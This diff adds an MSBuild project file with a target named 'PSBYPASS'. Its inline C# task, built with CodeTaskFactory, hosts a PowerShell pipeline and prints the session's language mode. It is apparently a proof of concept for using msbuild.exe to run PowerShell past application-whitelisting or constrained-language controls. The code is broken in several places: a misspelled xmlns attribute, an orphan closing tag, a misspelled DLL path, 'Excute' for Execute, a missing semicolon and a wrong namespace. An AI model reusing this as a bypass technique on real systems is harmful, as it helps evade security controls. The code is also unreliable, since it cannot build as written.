@@ -1,0 +1,50 @@
+<Project ToolsVersion="4.0" xmln="http://schemas.microsoft.com/developer/msbuild/2003">
+    <ItemGroup>
+    </ItemGroup>
+    <Target Name="PSBYPASS">
+        </PsCommand>
+    </Target>
+    <UsingTask
+        TaskName = "PsCommand"
+        TaskFactory = "CodeTaskFactory"
+        AssemblyFile = "c:\windows\microsoft.net\framework\v4.0.30319\microsoft.buid.tasks.v4.0.dll">
+        <Task>
+            <Reference Include="System.Management.Automation" />
+            <Code Type="Class" Language="cs">
+            <![CDATA[
+                using System;
+                using Microsoft.Build.Framework;
+                using Microsoft.Build.Utils;
+                using Powershell = System.Management.Automation.Powershell;
+
+                public class Powershell: Task, ITask
+                {
+                    public override bool Excute()
+                    {
+                        Console.WriteLine("Excuting Ps commands");
+
+                        //creaating PowerShell pipline
+                        PowerShell Ps_instance = Powershell.Create();
+
+                        //chaining commands in the pipline
+                        string script = "$ExcutionContext.SessionState.LanguageMode"
+                        Ps_instance.AddScript(script);
+
+                        //invoking the pipline
+                        foreach(string str in Ps_instance.Invoke<string>())
+                        {
+                            Console.WriteLine(str);
+                        }
+
+                        Console.WriteLine("Press any key to exit...");
+                        Console.ReadKey();
+
+                        return true;
+                    }
+                }
+
+            ]]>
+            </Code>
+        </Task>
+    </UsingTask>
+</Project>        
